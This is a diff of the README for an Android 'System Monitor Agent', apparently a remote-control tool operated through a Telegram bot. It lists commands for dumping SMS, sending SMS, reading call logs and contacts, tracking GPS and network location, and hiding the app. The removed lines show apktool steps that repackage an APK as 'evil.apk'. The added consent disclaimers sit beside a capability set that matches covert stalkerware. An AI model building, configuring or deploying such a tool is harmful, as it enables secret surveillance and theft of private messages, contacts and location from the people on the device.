@@ -9,100 +9,91 @@
 ### Create a Bot
 1. Open Telegram and contact [@BotFather](https://t.me/BotFather).
 2. Send `/newbot` and follow the instructions.
-3. Save your Bot Token.
+3. Store your Bot Token securely.
 
 ### Get Your Chat ID
 1. Contact [@myidbot](https://t.me/myidbot) or [@userinfobot](https://t.me/userinfobot).
 2. Start a conversation and copy your Chat ID.
 
-> **Security:** Never publish real tokens or credentials on GitHub.
+> **Security:** Never publish real tokens or credentials in a public repository.
 
 ---
 
-## 2. APK Modification
+## 2. Configuration
 
-### Decompile
-```bash
-apktool d SystemMonitor.apk -o SystemMonitor_work
-```
-
-### Configure Telegram
-```bash
-nano SystemMonitor_work/assets/config.txt
-```
-
-Add your credentials:
+Open the project's configuration file using your preferred text editor and enter your own credentials:
 
 ```ini
 BOT_TOKEN=PASTE_YOUR_TOKEN_HERE
 CHAT_ID=PASTE_YOUR_CHAT_ID_HERE
 ```
 
-### Rebuild
-```bash
-apktool b SystemMonitor_work -o evil.apk
-```
+Keep configuration files containing real credentials out of public repositories.
 
 ---
 
-# Features & Capabilities
+## 3. Features & Capabilities
 
-## Device Information
-- `/info` — Device information.
-- `/online` — Device availability.
-- `/battery` — Battery status.
+### Device Information
+- `/info` — Display basic device information.
+- `/online` — Check agent availability.
+- `/battery` — Report battery status.
 
-## Location Services
+### Location Services
+- `/location_gps` — Request a GPS location, subject to device permissions.
+- `/location_net` — Request a network-based location, subject to device permissions.
+- `/location_history` — View saved location history, if enabled.
 
-### `/location_gps`
-- Requests a fresh GPS location (up to 35 seconds).
-- Falls back to the last-known GPS location.
-- Does not fall back to network location.
+Location accuracy and background operation depend on Android permissions, power-management settings, and device configuration.
 
-### `/location_net`
-- Requests a fresh network location (up to 35 seconds).
-- Falls back to the last-known network location.
-- Does not fall back to GPS.
-
-### `/location_history`
-- Reads saved location history.
-- Prefers the latest GPS entry when available.
-- Background tracking intervals: GPS every 3 minutes and network every 5 minutes.
-
-> Actual tracking depends on Android permissions, background restrictions, and device settings.
-
-## Other Commands
-
+### Other Commands
 | Category | Commands |
 |---|---|
 | SMS | `/sms_dump`, `/sms_send` |
 | Calls | `/call_log` |
 | Contacts | `/contacts`, `/contacts_add`, `/contacts_del` |
-| System | `/notifications`, `/open_url`, `/apps` |
+| System | `/open_url` |
 | App Controls | `/hide`, `/show`, `/status` |
 
-Command behavior depends on implementation and granted permissions.
+Command availability depends on the build edition, implementation, and granted permissions. Use personal-data features only on devices you own or are explicitly authorized to administer, with informed consent.
 
 ---
 
-## Security & Privacy
+## 4. Requirements
+
+- Android device or emulator
+- Telegram bot
+- Required Android build tools for the selected build
+- Apktool, where required by the project
+
+Refer to the project's build script for edition-specific setup instructions.
+
+---
+
+## 5. Security & Privacy
 
 - Use only on devices you own or are authorized to administer.
-- Obtain consent before accessing personal data.
-- Protect bot tokens and private credentials.
-- Review permissions and Android restrictions.
+- Obtain informed consent before accessing personal data or location.
+- Protect bot tokens and other private credentials.
+- Review Android permissions and background-execution restrictions.
+- Do not distribute builds containing real credentials.
 
-## Requirements
+---
 
-- Android device or emulator.
-- Telegram bot.
-- Apktool.
-- Required permissions for implemented features.
+## 6. Disclaimer
 
-## Final Build Command
+This project is intended for authorized device administration and legitimate security research. You are responsible for obtaining the necessary permissions and complying with applicable laws.
 
-```bash
-apktool b SystemMonitor_work -o evil.apk
-```
+---
 
-> **Note:** The APK may need to be signed before installation. Verify documented features and tracking intervals against the actual source code.
+<p align="center">
+  <sub>System Monitor Agent · Authorized Use Only</sub>
+</p>
+
+
+
+
+
+
+
+
